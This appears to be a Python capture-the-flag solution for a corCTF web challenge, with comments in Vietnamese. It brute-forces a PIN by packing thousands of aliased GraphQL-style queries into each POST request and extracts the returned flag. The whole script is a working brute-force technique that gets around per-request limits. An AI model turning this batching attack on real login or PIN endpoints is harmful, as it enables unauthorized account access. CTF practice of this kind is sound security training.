import requests

URL = 'https://web-force-force-759f3ee7417d8886.be.ax/'  # Thay thế 'your_server_url' bằng URL của server bạn đang tấn công

def batched_brute_force(start, end):
    batch_size = 10000
    for i in range(start, end, batch_size):
        queries = ''
        for j in range(i, min(i + batch_size, end)):
            queries += f'\n    flag{j}:flag(pin:{j}),'
        query = f'{{{queries[:-1]}\n}}'
        
        response = requests.post(URL, json=query)

        print(f'Batch: {i} -> {i + batch_size - 1} ')
        if 'corctf' in response.text:
            index = response.text.find('corctf')
            end_index = response.text.find('}', index)
            if index != -1 and end_index != -1:
                result = response.text[index:end_index + 1]
                result = result.replace(' ', '')  # Loại bỏ tất cả các kí tự space
                print(f'Response: {result}')
            break

if __name__ == '__main__':
    start = 30000
    end = 40000
    batched_brute_force(start, end)



